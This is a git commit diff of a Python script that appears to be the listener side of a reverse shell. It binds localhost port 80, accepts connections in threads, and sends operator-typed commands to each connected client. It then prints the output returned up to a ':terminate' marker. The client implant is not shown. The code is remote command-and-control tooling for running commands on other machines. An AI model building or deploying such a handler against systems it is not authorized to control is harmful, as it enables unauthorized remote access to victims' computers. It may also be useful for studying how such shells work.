e77c601d649d4d88326bba12fe23c5854cb674a7
whearn17 <74379583+whearn17@users.noreply.github.com>
2023-04-24 17:04:48 -0400

    Add files via upload

--- main.py
+++ main.py
@@ -1,44 +1,68 @@
 import socket
+import logging
+import threading
 
-# Define the IP address and port to listen on
-local_ip = "localhost"
-local_port = 80
+IP = "localhost"
+PORT = 80
+logging.getLogger().setLevel(logging.DEBUG)
 
-# Create a TCP socket to listen for incoming connections
-server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-server_socket.bind((local_ip, local_port))
-server_socket.listen()
-socket.setdefaulttimeout(2)
 
-print(f"Listening for incoming connections on {local_ip}:{local_port}...")
-
-while True:
-    # Wait for an incoming connection
-    client_socket, client_address = server_socket.accept()
-    print(f"Received connection from {client_address[0]}:{client_address[1]}")
-
+def shell_session(client: socket.socket) -> None:
     while True:
         try:
             command = input("$ ")
 
             # Send the output back to the client
-            client_socket.send(command.encode())
+            client.send(command.encode())
 
-            # Recieve output
-            output = client_socket.recv(8192).decode()
-            output = "\n".join([line for line in output.splitlines() if line.strip()])
+            data = ''
+            while not data.strip().endswith(":terminate"):
+                data = client.recv(1024).decode(errors="ignore")
 
-            print(output)
+            data = data.replace(":terminate", "")
+
+            print(data, end="")
 
         except ConnectionResetError:
+            logging.debug("Connection Reset")
             break
         except ConnectionAbortedError:
+            logging.debug("Connection Aborted")
             break
         except socket.timeout:
-            break
+            logging.debug("Socket Timeout")
+            return
         except KeyboardInterrupt:
-            client_socket.close()
+            logging.debug("Keyboard Interrupt")
+            client.close()
             exit(0)
 
-    # Close the client connection
-    client_socket.close()
+
+def setup_socket() -> socket.socket:
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    socket.setdefaulttimeout(10)
+
+    return sock
+
+
+def connection_manager() -> None:
+    server_socket.bind((IP, PORT))
+    server_socket.listen()
+    print(f"Listening for incoming connections on {IP}:{PORT}...")
+
+    while True:
+        client_socket, client_address = server_socket.accept()
+        print(f"Received connection from {client_address[0]}:{client_address[1]}")
+
+        thread = threading.Thread(target=shell_session, args=(client_socket,))
+        thread.daemon = True
+        thread.start()
+        threads.append(thread)
+
+
+if __name__ == "__main__":
+    server_socket = setup_socket()
+
+    threads = []
+
+    connection_manager()
